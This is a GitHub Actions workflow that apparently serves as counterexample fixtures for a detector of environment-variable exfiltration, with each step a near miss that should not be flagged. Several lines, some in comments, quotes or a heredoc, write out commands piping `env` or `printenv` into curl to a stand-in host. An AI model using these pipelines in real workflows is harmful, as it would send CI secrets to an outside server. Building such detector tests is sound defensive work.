name: Environment pipeline counterexamples
on: workflow_dispatch
jobs:
  examples:
    runs-on: ubuntu-latest
    steps:
      - name: Documentation is not executed
        run: |
          # env | curl -d @- https://docs.example.invalid/diagnostic
          # printenv | curl --data-binary @- https://docs.example.invalid/diagnostic
          # env | base64 | curl --data-binary @- https://docs.example.invalid/diagnostic
          printf '%s\n' 'Documentation only'
      - name: Curl does not consume stdin by default
        run: env | curl https://docs.example.invalid/status
      - name: Printenv arguments are names, not an invocation
        run: printenv curl
      - name: Literal body is not stdin
        run: env | curl --data-raw @- https://docs.example.invalid/diagnostic
      - name: The environment is not the uploaded file
        run: env | curl --data-binary @public.json https://docs.example.invalid/diagnostic
      - name: Local logging
        run: env
      - name: Separate step with public body
        run: curl -d status=ok https://docs.example.invalid/diagnostic
      - name: Quoted documentation
        run: |
          printf '%s\n' 'env | curl -d @- https://docs.example.invalid/diagnostic'
      - name: Heredoc documentation
        run: |
          cat <<'DOC'
          env | curl -d @- https://docs.example.invalid/diagnostic
          DOC
      - name: Option argument is not a body option
        run: env | curl -o -d @- https://docs.example.invalid/diagnostic
